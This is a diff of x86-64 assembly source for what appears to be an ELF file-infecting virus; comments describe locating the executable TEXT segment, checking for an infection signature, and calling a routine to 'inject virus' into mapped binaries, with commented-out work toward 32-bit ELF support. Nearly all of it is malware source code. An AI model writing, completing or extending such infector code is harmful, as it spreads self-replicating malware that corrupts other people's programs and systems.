@@ -2,6 +2,7 @@ section .text
 	global _treat_file
 	global _final_end
 	extern _update_mmaped_file
+	extern _update_mmaped_file32
 	extern _string
 	extern _ft_strlen
 
@@ -173,6 +174,30 @@ _lab_test:
 ;;		uint16_t      e_shstrndx;			2
 ;;	} ElfN_Ehdr								52|64
 ;; ---------------------------------------------------
+;; ELF Program Header
+;;
+;;	typedef struct {
+;;		uint32_t   p_type;		4
+;;		Elf32_Off  p_offset;	4
+;;		Elf32_Addr p_vaddr;		4
+;;		Elf32_Addr p_paddr;		4
+;;		uint32_t   p_filesz;	4
+;;		uint32_t   p_memsz;		4
+;;		uint32_t   p_flags;		4
+;;		uint32_t   p_align;		4
+;;	} Elf32_Phdr;				32
+
+;;	typedef struct {
+;;		uint32_t   p_type;		4
+;;		uint32_t   p_flags;		4
+;;		Elf64_Off  p_offset;	8
+;;		Elf64_Addr p_vaddr;		8
+;;		Elf64_Addr p_paddr;		8
+;;		uint64_t   p_filesz;	8
+;;		uint64_t   p_memsz;		8
+;;		uint64_t   p_align;		8
+;;	} Elf64_Phdr;				56
+;; ---------------------------------------------------
 
 ;; Check ELF header
 _check_file_header:
@@ -196,8 +221,91 @@ _check_file_header:
 	;; If not EFLCLASS32 or EFLCLASS64, munmap file
 	jmp _munmap
 
+;; Parser ELF32 header
 _parse_elf32_ehdr:
 	jmp _munmap
+; 	;; Get ehdr->e_phoff (program header table offset)
+; 	mov r10, QWORD [rsp + 24]	; mmap_base_addr
+; 	mov QWORD [rsp + 32], r10	; phdr = r10
+; 	add QWORD [rsp + 32], 28	; ehdr->e_phoff
+; 	mov r10d, DWORD [rsp + 32]	; r10 = ehdr->e_phoff
+; 	mov r10d, DWORD [r10]		; r10 = *r10
+;
+; 	;; if (ehdr->e_phoff >= file_size)
+; 	cmp r10d, DWORD [rsp + 16]
+; 	jge _munmap
+;
+; 	;; if (ehdr->e_phoff != 52)
+; 	;; Elf32_Phdr table should be located right after Elf32_Ehdr (52 bytes)
+; 	cmp r10d, 52
+; 	jne _munmap
+;
+; 	mov DWORD [rsp + 32], r10d	; phdr = r10, save ph_offset value
+; 	mov r10, QWORD [rsp + 24]	; r10 = mmap addr
+; 	add DWORD [rsp + 32], r10d	; add the ph_offset to the mmap_base_address, to work on our mmaped buffer
+; 	mov QWORD [rsp + 40], 0		; phnum = 0
+;
+; 	;; Get ehdr->e_phnum (program header table number)
+; 	mov r10, QWORD [rsp + 24]	; take mmap_base_address
+; 	mov QWORD [rsp + 48], r10	; move it on stack
+; 	add QWORD [rsp + 48], 44	; add 44 to the mmap_base_address, it's the offset of e_phnum
+; 	mov r11, QWORD [rsp + 48]	; mov this address on r11
+; 	xor r10, r10				; r10 = 0
+; 	mov r10w, WORD [r11]		; now we dereference our address to access the e_phnum value, and store it on r10
+; 	mov QWORD [rsp + 48], r10	; save it on stack
+;
+; 	;; if (ehdr->e_phnum < 0)
+; 	cmp r10, 0
+; 	jl _munmap
+;
+; ;; Loop on each segment to find the TEXT segment
+; _loop_elf32_phdr:
+; 	;; if (phnum >= ehdr->e_phnum)
+; 	mov r10, QWORD [rsp + 40]	; current phnum (starts at 0)
+; 	cmp r10, QWORD [rsp + 48]	; compare phnum and ehdr->e_phnum
+; 	jge _munmap
+;
+; 	mov r10, QWORD [rsp + 32]	; current phdr
+;
+; 	;; if (phdr->p_type != 1)
+; 	cmp DWORD [r10], 1
+; 	jne _next_elf32_phdr
+;
+; 	;; if ((phdr->p_flags & 1) != 1)
+; 	add r10, 24					; r10 = phdr + 24 (== phdr->p_flags)
+; 	mov r10d, DWORD [r10]		; r10d = *r10
+; 	and r10d, 1					; r10d = r10d & 1
+; 	cmp r10d, 1					; if (r10d != 1)
+; 	jne _next_elf64_phdr
+;
+; 	;; We found the TEXT segment
+; 	;; We need to go find signature offset
+; 	mov r10, QWORD [rsp + 32]	; r10 = phdr
+; 	add r10, 4					; r10 = phdr + 4 (== phdr->p_offset)
+; 	mov r10, QWORD [r10]		; r10 = *r10
+; 	mov QWORD [rsp + 56], r10	; [rsp+56] = r10
+;
+; 	mov r10, QWORD [rsp + 32]	; r10 = phdr
+; 	add r10, 16					; r10 = phdr + 16 (== phdr->p_filesz)
+; 	mov r10, QWORD [r10]		; r10 = *r10
+; 	add QWORD [rsp + 56], r10	; [rsp+56] = phdr->p_offset + phdr->p_filesz
+; 	mov r10, QWORD [rsp + 8]	; virus size
+; 	sub QWORD [rsp + 56], r10	; [rsp+56] - virus size (supposed signature offset)
+;
+; 	;; Move pointer from mmap base address to signature offset
+; 	cmp QWORD [rsp + 56], 0
+; 	jle _call_mmaped_update
+;
+; 	; now we have the theoric offset of our string, we need to add this offset on the mmap address
+; 	mov r10, QWORD [rsp + 24]	; mmap base address
+; 	add QWORD [rsp + 56], r10	; file signature address
+; 	jmp _init_cmp_loop
+;
+; ;; Increment phdr / phnum, and loop on next segment
+; _next_elf32_phdr:
+; 	add QWORD [rsp + 32], 32	; move on the the next phdr (phdr += 1)
+; 	inc QWORD [rsp + 40]		; increment phnum by one (phnum++)
+; 	jmp _loop_elf32_phdr		; next segment loop
 
 ;; Parse ELF64 header
 _parse_elf64_ehdr:
@@ -235,32 +343,6 @@ _parse_elf64_ehdr:
 	cmp r10, 0
 	jl _munmap
 
-;; ---------------------------------------------------
-;; ELF Program Header
-;;
-;;	typedef struct {
-;;		uint32_t   p_type;		4
-;;		Elf32_Off  p_offset;	4
-;;		Elf32_Addr p_vaddr;		4
-;;		Elf32_Addr p_paddr;		4
-;;		uint32_t   p_filesz;	4
-;;		uint32_t   p_memsz;		4
-;;		uint32_t   p_flags;		4
-;;		uint32_t   p_align;		4
-;;	} Elf32_Phdr;				32
-
-;;	typedef struct {
-;;		uint32_t   p_type;		4
-;;		uint32_t   p_flags;		4
-;;		Elf64_Off  p_offset;	8
-;;		Elf64_Addr p_vaddr;		8
-;;		Elf64_Addr p_paddr;		8
-;;		uint64_t   p_filesz;	8
-;;		uint64_t   p_memsz;		8
-;;		uint64_t   p_align;		8
-;;	} Elf64_Phdr;				56
-;; ---------------------------------------------------
-
 ;; Loop on each segment to find the TEXT segment
 _loop_elf64_phdr:
 	;; if (phnum >= ehdr->e_phnum)
@@ -295,13 +377,11 @@ _loop_elf64_phdr:
 	mov r10, QWORD [rsp + 8]	; virus size
 	sub QWORD [rsp + 56], r10	; [rsp+56] - virus size (supposed signature offset)
 
-;; Set pointer to mmap base address at signature offset
-_cmp_offset:
 	;; if our string addr is lower than the mmap addr, so we are out of the file, and this one cant hold our virus
 	cmp QWORD [rsp + 56], 0
 	jle _call_mmaped_update
 
-	; now we have the theoric offset of our string, we need to add this offset on the mmap address
+	;; Move pointer from mmap base address to signature offset
 	mov r10, QWORD [rsp + 24]	; mmap base address
 	add QWORD [rsp + 56], r10	; file signature address
 	jmp _init_cmp_loop
@@ -330,6 +410,7 @@ _cmp:
 	jmp _cmp					; loop back
 
 ;; If signature not found, update file and inject virus
+
 _call_mmaped_update:
 	;; Init argument for next function
 	mov rdi, QWORD [rsp + 24]	; mmap_base_addr
@@ -341,8 +422,24 @@ _call_mmaped_update:
 	sub rsp, 8
 	mov QWORD [rsp], r11
 	add QWORD [rsp], 8
-	call _update_mmaped_file
 	add rsp, QWORD [rsp]
+	call _update_mmaped_file
+
+; 	;; Switch update call according to ELF class
+; 	mov rax, QWORD [rsp + 24]
+; 	cmp BYTE [rax + 4], 1
+; 	je _call_mmaped_update32
+; 	jmp _call_mmaped_update64
+;
+; _call_mmaped_update32:
+; 	call _update_mmaped_file32
+; 	jmp _end_mmaped_update
+;
+; _call_mmaped_update64:
+; 	call _update_mmaped_file
+;
+; _end_mmaped_update:
+; 	add rsp, QWORD [rsp]
 
 ;; Unmap file
 _munmap:
